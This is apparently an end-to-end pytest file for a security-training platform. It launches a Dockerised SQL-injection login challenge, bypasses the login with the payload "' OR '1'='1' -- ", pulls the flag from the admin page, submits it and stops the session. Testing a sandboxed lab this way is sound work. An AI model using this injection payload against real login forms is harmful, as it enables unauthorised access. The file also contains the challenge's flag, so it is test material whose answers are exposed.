from pathlib import Path
from unittest.mock import AsyncMock

import docker
import pytest
from fastapi.testclient import TestClient

from app import main
from app.models import Challenge, ChallengeMetadata, Difficulty, Track
from app.routers import attack, auth
from app.services import attack_session

SQLI_PAYLOAD = "' OR '1'='1' -- "


def make_real_challenge() -> Challenge:
    base_path = Path(__file__).resolve().parents[1] / "challenges" / "security" / "sqli-login-bypass"
    return Challenge(
        metadata=ChallengeMetadata(
            id="sqli-login-bypass",
            name="SQL Injection: Login Bypass",
            track=Track.SECURITY,
            difficulty=Difficulty.EASY,
            category="injection",
            description="Exploit the login form.",
            estimated_minutes=20,
            flag="FLAG{sql_injection_is_not_authentication}",
        ),
        scenario="Exploit the vulnerable login form.",
        code_files={},
        reference_summary="",
        base_path=str(base_path),
        dockerfile_path=str(base_path / "Dockerfile"),
    )


@pytest.fixture
def e2e_client(monkeypatch):
    try:
        docker_client = docker.from_env()
        docker_client.ping()
    except Exception as exc:
        pytest.skip(f"Docker not available for E2E test: {exc}")

    try:
        docker_client.images.remove("lector-challenge-sqli-login-bypass:latest", force=True)
    except docker.errors.ImageNotFound:
        pass

    attack_session._sessions.clear()
    attack_session._client = None

    monkeypatch.setattr(main, "connect_db", AsyncMock())
    monkeypatch.setattr(main, "close_db", AsyncMock())
    monkeypatch.setattr(main, "load_challenges", lambda: {})
    monkeypatch.setattr(attack, "get_challenge", lambda challenge_id: make_real_challenge())
    monkeypatch.setattr(attack, "is_db_connected", lambda: False)

    main.app.dependency_overrides[auth.require_session] = lambda: {"session_id": "e2e-user"}
    with TestClient(main.app) as client:
        yield client
    main.app.dependency_overrides.clear()


@pytest.mark.e2e
def test_sqli_attack_flow_e2e(e2e_client):
    challenge_id = "sqli-login-bypass"

    start = e2e_client.post(f"/api/attack/{challenge_id}/start")
    assert start.status_code == 200
    assert start.json()["status"] == "running"

    login_page = e2e_client.get(f"/api/attack/{challenge_id}/proxy/login")
    assert login_page.status_code == 200
    assert "Acme Corp" in login_page.text

    exploit = e2e_client.post(
        f"/api/attack/{challenge_id}/proxy/login",
        data={"username": SQLI_PAYLOAD, "password": "anything"},
        follow_redirects=False,
    )
    assert exploit.status_code in (200, 302)
    if exploit.status_code == 302:
        assert exploit.headers["location"].endswith(
            f"/api/attack/{challenge_id}/proxy/admin"
        )
        admin = e2e_client.get(exploit.headers["location"])
    else:
        admin = exploit

    assert admin.status_code == 200
    marker = "FLAG{"
    start_index = admin.text.index(marker)
    end_index = admin.text.index("}", start_index)
    captured_flag = admin.text[start_index:end_index + 1]
    assert captured_flag.startswith("FLAG{sql_injection_is_not_authentication_")

    flag = e2e_client.post(
        f"/api/attack/{challenge_id}/flag",
        json={"flag": captured_flag},
    )
    assert flag.status_code == 200
    assert flag.json()["accepted"] is True

    stop = e2e_client.post(f"/api/attack/{challenge_id}/stop")
    assert stop.status_code == 200
    assert stop.json()["status"] == "stopped"
